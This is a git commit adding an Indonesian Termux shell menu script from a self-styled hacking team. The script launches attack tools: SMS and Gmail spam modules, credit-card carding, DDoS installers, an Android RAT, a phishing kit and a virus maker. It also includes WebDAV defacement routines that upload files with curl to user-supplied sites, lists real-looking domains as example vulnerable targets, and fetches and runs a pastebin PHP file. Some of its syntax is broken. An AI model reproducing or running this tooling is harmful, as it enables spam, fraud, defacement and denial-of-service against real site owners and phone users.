d4d1b3920132957fc1a35c0ef812cba6ef6df687
DarknessCyberTeam <38211186+DarknessCyberTeam@users.noreply.github.com>
2018-04-19 23:47:20 +0000

    Add files via upload

---
+++ B4J1N64N.sh
@@ -0,0 +1,799 @@
+#!/system/xbin/bash
+clear
+blue='\e[1;34m'
+green='\e[1;32m'                                        
+purple='\[1;35m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+white='\e[1;37m'                                           
+yellow='\e[1;33m'
+sleep 1
+echo "\033[32;1m=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*="
+toilet -f standard -F gay "ToolsB4j1n64n3"
+echo "\033[31;1m=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*="
+echo ""              
+echo "Author : " Mr.B4J1N64N====>Noob Lamer"
+" Team : " DARKNESS CYBER TEAM"
+echo " Kontak Me :  083108271123"
+sleep 1
+echo "ThanksTo:"
+echo "Allmember DARKNESS CYBER TEAM"
+echo "\033[31;1m[============================[>"
+echo ""
+sleep 1
+echo "\033[32;1m Silahkan Pilih Tools Yang mau Kamu pake:)?:"
+echo "[================================================{>"
+echo "1.> Spam Sms Tokopedia"
+echo "\033[36;1m[===============================================]>"
+echo "2.> Spam Sms Telkomnyet"
+echo "\033[32;1m[===============================================]>"
+echo "3.> Spam Sms Matahari Mall"
+echo "\033[36;1m[===============================================]>"
+echo "4.> Spam Sms HooqTV"
+echo "\033[32;1m[===============================================]>"
+echo "5.> Spam Sms KFC"
+echo "\033[36;1m[===============================================]>"
+echo "6.> Spam Sms PHD"
+echo "\033[32;1m[===============================================]>"
+echo "7.> Spam Sms Whiskas"
+echo "\033[36;1m[===============================================]>"
+echo "8.> Spam Sms ZiPAY"
+echo "\033[32;1m[===============================================]>"
+echo "9.> Nyari CC buat Carding"
+echo "\033[36;1m[===============================================]>"
+echo "10.> Spam Akun Gmail"
+echo "\033[32;1m[===============================================]>"
+echo "11.> Whois LookUp"
+echo "\033[36;1m[===============================================]>"
+echo "12.> Upload Admin Finder"
+echo "\033[32;1m[===============================================]>"
+echo "13.> Script Deface Creator"
+echo "\033[36;1m[===============================================]>"
+echo "14.> ReConDog"
+echo "\033[32;1m[===============================================]>"
+echo "15.> Admin Login Finder"
+echo "\033[36;1m[===============================================]>"
+echo "16.> Virus VbugMaker Creator"
+echo "\033[32;1m[===============================================]>"
+echo "17.> Html Downloader"
+echo "\033[36;1m[===============================================]>"
+echo "18.> Autolike Facebook"
+echo "\033[32;1m[===============================================]>"
+echo "19.> Facebook Auto_Reaction"
+echo "\033[36;1m[===============================================]>"
+echo "20.> Bot Komentar Facebook"
+echo "\033[32;1m[===============================================]>"
+echo "21.> Install txtool"
+echo "\033[36;1m[===============================================]>"
+echo "22.> install sqlscan"
+echo "\033[32;1m[===============================================]>"
+echo "23.> install hash-buster"
+echo "\033[36;1m[===============================================]>"
+echo "24.> Install Red_Hawk"
+echo "\033[32;1m[===============================================]>"
+echo "25.> Install Torshammer buat DDOS website"
+echo "\033[36;1m[===============================================]>"
+echo "26.> Install LITEDDOS buat DDOS website"
+echo "\033[32;1m[===============================================]>"
+echo "27.> Install Hunner Framework"
+echo "\033[36;1m[===============================================]>"
+echo "28.> Install Sqlmap"
+echo "\033[32;1m[===============================================]>"
+echo "29.> Install 4wsectools"
+echo "\033[36;1m[===============================================]>"
+echo "30.> Install Lazymux"
+echo "\033[32;1m[===============================================]>"
+echo "31.> Mempercepat / Menstabilkan Jaringan/sinyal"
+echo "\033[36;1m[===============================================]>"
+echo "32.> Mempercepat / menstabilkan jaringan 2"
+echo "\033[32;1m[===============================================]>"
+echo "33.> Install BinGoo"
+echo "\033[36;1m[===============================================]>"
+echo "34.> Full Bot Facebook"
+echo "\033[32;1m[===============================================]>"
+echo "35.> Install Termux-A"
+echo "\033[36;1m[===============================================]>"
+echo "36.> Install Tools GadoGado"
+echo "\033[32;1m[===============================================]>"
+echo "37.> Install Lazysqlmap"
+echo "\033[36;1m[===============================================]>"
+echo "38.> Install tools diejoubu"
+echo "\033[32;1m[===============================================]>"
+echo "39.> Install weeman"
+echo "\033[36;1m[===============================================]>"
+echo "40.> Install iesDEFACE buat Deface Poc Webdav"
+echo "\033[32;1m[===============================================]>"
+echo "41.> install errorcybertools"
+echo "\033[36;1m[===============================================]>"
+echo "42.> install A-Rat untuk Retas Android"
+echo "\033[32;1m[===============================================]>"
+echo "43.> Scan-Website-Admin-Login"
+echo "\033[36;1m[===============================================]>"
+echo "44.> DEFACE metode Webdav"
+echo "\033[32;1m[===============================================]>"
+echo "45.> Tools Katoolin"
+echo "\033[36;1m[===============================================]>"
+echo "46.> Main Tebak2 kan:v biar ga bt:v"
+echo "\033[32;1m[===============================================]>"
+echo "47.> Brute DEFACE webdav"
+echo "\033[36;1m[===============================================]>"
+echo "48.> Browsing Di Termux"
+echo "\033[32;1m[===============================================]>"
+echo "49.> Dengerin Lagu Youtube di Termux"
+echo "\033[36;1m[===============================================]>"
+echo "50.> Tebak Tebak Kan Soal Cinta Tod:v"
+echo "\033[32;1m[===============================================]>"
+echo "51.> Nuyul Bitcoin"
+echo "\033[36;1m[===============================================]>"
+echo "52.> Install MetaSploit"
+echo "\033[32;1m[===============================================]>"
+echo "0.> keluar"
+echo "\033[35;1m[===============================================]>"
+read -p "[MrB4J1N64N]==>" bro
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+echo "\033[34;1m"
+figlet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+php tp.php
+fi
+
+if
+[ $bro = 2 ] || [ $bro = 2 ]
+then
+clear
+echo "\033[31;1m"
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+php t.php
+fi
+
+if [ $bro = 3 ] || [ $bro = 3 ]
+then
+clear
+echo "\033[31;1m"
+figlet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+php mataharimall.php
+fi
+
+if [ $bro = 4 ] || [ $bro = 4 ]
+then
+clear
+echo "\033[33;1m"
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+php hooq.php
+fi
+
+if [ $bro = 5 ] || [ $bro = 5 ]
+then
+clear
+toilet -f slant --gay "Mr.B4J1N64N"
+echo "\033[31;1m"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+php kfc.php
+fi
+
+if [ $bro = 6 ] || [ $bro = 6 ]
+then
+clear
+toilet -f mono12 -F gay "Mr.B4J1N64N"
+echo "\033[30;1m"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+php phd.php
+fi
+
+if [ $bro = 7 ] || [ $bro = 7 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+php whiskas.php
+fi
+
+if [ $bro = 8 ] || [ $bro = 8 ]
+then
+clear
+figlet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+php zipay.php
+fi
+
+if [ $bro = 9 ] || [ $bro = 9 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+php key.php
+fi
+
+if [ $bro = 10 ] || [ $bro = 10 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+python2 SpamMail.py
+fi
+
+if [ $bro = 11 ] || [ $bro = 11 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+python2 whs.py
+fi
+
+if [ $bro = 12 ] || [ $bro = 12 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+python2 upf.py
+fi
+
+if [ $bro = 13 ] || [ $bro = 13 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+python2 create.py
+fi
+
+if [ $bro = 14 ] || [ $bro = 14 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+ls
+cd module
+python2 dog.py
+fi
+
+if [ $bro = 15 ] || [ $bro = 15 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+python2 gam.py
+fi
+
+if [ $bro = 16 ] || [ $bro = 16 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+python2 anvima.py
+fi
+
+if [ $bro = 17 ] || [ $bro = 17 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+python2 htmd.py
+fi
+
+if [ $bro = 18 ] || [ $bro = 18 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+php autolike.php
+fi
+
+if [ $bro = 19 ] || [ $bro = 19 ]
+then
+clear
+toilet "Mr.B4J1N64N"
+cd
+cd T00Ls-B4J1N64Nv3
+ls
+cd module
+python2 auto_reaction.py
+fi
+
+if [ $bro = 20 ] || [ bro = 20 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+cd T00Ls-B4J1N64Nv3
+cd module
+python2 botkomen.py
+fi
+
+if [ $bro = 21 ] || [ $bro = 21 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+git clone https://github.com/kuburan/txtool
+cd txtool
+python2 install.py
+python2 update.py
+txtool
+fi
+
+
+if [ $bro = 22 ] || [ bro = 22 ]
+then
+clear
+toilet -f slant -F gay "Mr.B4J1N64N" 
+pkg install update && pkg install upgrade
+pkg install git
+pkg install php
+cd
+cd T00Ls-B4J1N64Nv3
+cd module
+php sqlscan.php
+fi
+
+if [ $bro = 23 ] || [ $bro = 23 ]
+then
+clear
+toilet -f mono12 -F gay "Mr.B4J1N64N" 
+apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/UltimateHackers/Hash-Buster
+cd Hash-Buster
+python2 hash.py
+fi
+
+if [ $bro = 24 ] || [ $bro = 24 ]
+then
+clear
+toilet -f standard -F gay "Mr.B4J1N64N" 
+apt update
+apt install git
+apt install php
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+cd RED_HAWK
+chmod +x rhawk.php
+php rhawk.php
+fi
+
+if [ $bro = 25 ] || [ $bro = 25 ]
+then
+clear
+toilet -f standard -F gay "Mr.B4J1N64N" 
+apt update
+apt install git
+apt install tor
+git clone https://github.com/dotfighter/torshammer.git
+cd torshammer
+python2 torshammer.py $target
+fi
+
+if [ $bro = 26 ] || [ $bro = 26 ]
+then
+clear
+toilet -f standard -F gay "Mr.B4J1N64N" 
+apt update
+apt install git
+git clone https://github.com/4L13199/LITEDDOS
+cd LITEDDOS
+python2 liteDDOS.py $target
+fi
+
+if [ $bro = 27  || [ $bro = 27 ]
+then
+clear
+toilet -f standard -F gay "Mr.B4J1N64N" 
+apt update
+apt install git
+git clone https://github.com/b3-v3r/Hunner.git
+cd Hunner
+chmod +x hunner.py
+python2 hunner.py
+fi
+
+if [ $bro = 28 ] || [ $bro = 28 ]
+then
+clear
+toilet -f standard -F gay "Mr.B4J1N64N" 
+apt update
+apt install git
+git clone https://github.com/sqlmapproject/sqlmap
+cd sqlmap
+python2 sqlmap.py $target
+fi
+
+if [ $bro = 29 ] || [ $bro = 29 ]
+then
+clear
+toilet -f standard -F gay "Mr.B4J1N64N" 
+apt update
+apt install git
+git clone https://github.com/aryanrtm/4wsectools
+cd 4wsectools
+chmod 777 tools
+./tools
+fi
+
+if [ $bro = 30 ] || [ $bro = 30 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+apt update && upgrade
+apt install python2 
+apt install git
+cd module
+python2 lazymux.py
+fi
+
+if [ $bro = 31 ] || [ $bro = 31 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+echo "\033[32;m====================Mempercepat / menstabilkan sinyal===================="
+sleep 1
+echo "\033[32;1m================================By Mr.B4J1N64N================================"
+sleep 1
+echo ""
+echo ""
+ping 8.8.8.8 
+fi
+
+if [ $bro = 32 ] || [ $bro = 32 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+echo "\033[32;m===================Mempercepat / menstabilkan sinyal 2===================="
+sleep 1
+echo "\033[32;1m================================By Mr.B4J1N64N================================"
+sleep 1
+echo ""
+echo ""
+ping -D www.google.com
+fi
+
+if [ $bro = 33 ] || [ $bro = 33 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+git clone https://github.com/Hood3dRob1n/BinGoo
+cd BinGoo
+bash bingoo
+fi
+
+if [ $bro = 34 ] || [ $bro = 34 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+cd module
+python2 facebook.py
+fi
+
+if [ $bro = 35 ] || [ $bro = 35 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+apt update && apt upgrade
+apt install termux-api
+apt install git
+apt install php
+git clone https://github.com/Cvar1984/Termux-A.git
+cd Termux-A
+php run.php
+fi
+
+if [ $bro = 36 ] || [ $bro = 36 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+apt update && apt upgrade
+apt install ruby
+apt install lolcat
+apt install git
+git clone https://github.com/Senitopeng/GadoGado.git
+cd GadoGado
+bash gado
+fi
+
+if [ $bro = 37 ] || [ $bro = 37 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+apt update && apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/verluchie/termux-lazysqlmap.git
+cd termux-lazysqlmap
+chmod 777 install.sh
+./install.sh
+lazysqlmap
+fi
+
+if [ $bro = 38 ] || [ $bro = 38 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1 
+apt install git
+apt install php
+git clone https://github.com/alintamvanz/diejoubu
+cd diejoubu
+cd v1.2
+php diejoubu.php
+fi
+
+if [ $bro = 39 ] || [ $bro = 39 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1 
+apt install git
+apt install php
+git clone https://github.com/evait-security/weeman.git
+cd weeman
+python2 weeman.py
+fi
+
+if [ $bro = 40 ] || [ $bro = 40 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1 
+apt install git
+apt install bash
+pip2 install bash
+git clone https://github.com/ALX-04/iesDEFACE
+cd iesDEFACE
+bash iesDeface.sh
+fi
+
+if [ $bro = 41 ] || [ $bro = 41 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+git clone https://github.com/MrKeepSmile/errorcybertool.git
+cd errorcybertool
+chmod 777 errorcyber
+./errorcyber
+fi
+
+if [ $bro = 42 ] || [ $bro = 42 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+git clone https://github.com/Xi4u7/A-Rat.git
+cd A-Rat
+python2 A-Rat.py
+fi
+
+if [ $bro = 43 ] || [ $bro = 43 ]
+then
+clear
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+git clone https://github.com/DarknessCyberTeam/Scan-Website-Admin-Login
+cd Scan-Website-Admin-Login
+python2 Admin-Login.py
+fi
+
+if [ $bro = 44 ] || [ $bro = 44 ]
+then
+clear
+echo "\033[34;1m"
+cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+figlet -f slant MrB4J1N64N
+echo "\033[37;1m"
+echo "Masukan Web target"
+echo "Contoh Web Target vuln"
+echo "	http://bestilling.udir.no/"
+echo "	http://560560.ru/"
+echo "	http://myownemailer.com/"
+echo "	http://Zoocentral.co.za/"
+echo "	http://50-50-50.ru/"
+echo "	http://tirupurjobs.net/"
+echo "	http://Matrimony.co.za/"
+echo "	http://Bheh.co.za/"
+read -p "[MrB4J1N64N]>" target
+echo "Masukan Nama script kalian"
+echo "yang ada di Luar Folder Ruang Penyimpanan"
+read -p "[MrB4J1N64N]>" script
+curl -T /storage/emulated/0/$script $target
+echo "\033[33;1m"
+echo "Selesai! Tod Cek di $target $script "
+fi
+
+if [ $bro = 45 ] || [ $bro = 45 ]
+then
+clear
+cowsay -f sheep.cow "MrB4J1N64N" | lolcat
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+cd
+cd T00Ls-B4J1N64N3
+cd module
+python2 katoolin.py
+fi
+
+if [ $bro = 46 ] || [ $bro = 46 ]
+then
+clear
+cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+cd T00Ls-B4J1N64Nv3
+cd module
+python2 r.py
+fi
+
+if [ $bro = 47 ] || [ $bro = 47 ]
+then
+clear
+echo "\033[32;1m"
+figlet -f slant Brute DEFACE WebDav
+echo "Pilih script"
+read -p "[MrB4J1N64N]>" script
+echo "\033[36;1m"
+echo "pilih Web target Ke1"
+read -p "[MrB4J1N64N]>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo "\033[32;1m" "pilih Web target Ke2"
+read -p "[MrB4J1N64N]>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo "\033[36;1m" "pilih Web target Ke3
+read -p "[MrB4J1N64N]>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo "\033[32;1m" "pilih Web target Ke4"
+read -p "[MrB4J1N64N]>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo "\033[36;1m" "pilih Web target Ke5
+read -p "[MrB4J1N64N]>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo "\033[32;1m" "pilih Web target Ke6"
+read -p "[MrB4J1N64N]>" Ke6
+curl -T /storage/emulated/0/$script $Ke6
+echo "\033[36;1m" "pilih Web Target Ke7"
+read -p "[MrB4J1N64N]>" Ke7
+curl -T /storage/emulated/0/$script $Ke7
+echo "\033[32;1m " Pilih Web Target Ke8"
+read -p "[MrB4J1N64N]>" Ke8
+curl -T /storage/emulated/0/$script $Ke8
+echo "\033[36;1m" "Pilih Web Target Ke9"
+read -p "[MrB4J1N64N]>" Ke9
+curl -T /storage/emulated/0/$script $Ke9
+echo " \033[32;1m" "Pilih Web Target Ke10"
+read -p "[MrB4J1N64N]>" Ke10
+curl -T /storage/emulated/0/$script $Ke10
+sleep 1
+echo "\033[35;1m" " Mohon Tunggu Sebentar "
+sleep 1
+echo "***************SEDANG PROSES***************"
+echo "Jika Gagal Berarti Web nya Tidak Vuln Bro!"
+echo "Silahkan cek  $Ke1/$script"
+echo "Silahkan cek  $Ke2/$script"
+echo "Silahkan cek  $Ke3/$script"
+echo "Silahkan cek  $Ke4/$script"
+echo "Silahkan Cek $Ke5/$script"
+echo "Silahkan Cek $Ke6/$script"
+echo "Silahkan Cek $Ke7/$script"
+echo "*************************SELESAI*************************"
+fi
+
+if [ $bro = 48 ] || [ $bro = 48 ]
+then
+clear
+cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+pkg install w3m
+w3m www.google.com
+fi
+
+if [ $bro = 49 ] || [ $bro = 49 ]
+then
+clear
+cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+apt update && apt upgrade
+apt install pip
+pip install mps_youtube
+pip install youtube_dl
+pkg install mpv
+mpsyt
+fi
+
+if [ $bro = 50 ] || [ $bro = 50 ]
+then
+clear
+cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+cd T00Ls-B4J1N64Nv3
+cd module
+python2 cinta.py
+fi
+
+if [ $bro = 51 ] || [ $bro = 51 ]
+then
+clear
+cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+pkg install php -y && pkg install wget -y && wget -O tuyul.php https://pastebin.com/raw/3ERZV3nL && php tuyul.php
+fi
+
+if [ $bro = 52 ] || [ $bro = 52 ]
+then
+clear
+cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+figlet "Mr.B4J1N64N" | lolcat
+sleep 1
+pkg install curl
+curl -LO https://raw.githubusercontent.com/Techzindia/Metasploit_for_Termux/master/metasploitTechzindia.sh
+chmod +x metasploitTechzindia.sh
+./metasploitTechzindia.sh
+cd metasploit
+./msfconsole
+
+if [ $bro = 0 ] || [ $bro = 0 ]
+then
+echo "\033[32;1mWe Are Family DARKNESS CYBER TEAM"
+sleep 1
+echo "\033[33;1mWe Are Anonymous"
+sleep 1
+echo " "We Are Legion"
+sleep 1
+echo " "We Do Not For Give"
+sleep 1
+echo " "We Do Not For Get"
+sleep 1
+echo " "The Indonesian Anonymous Family"
+sleep 1
+echo " "Expect Us"
+sleep 1
+echo "\033[32;1m Incarlah suatu hal mustahil:) Suatu saat Kamu akan Mendapatkannya:)"
+sleep 1
+exit
+fi
+
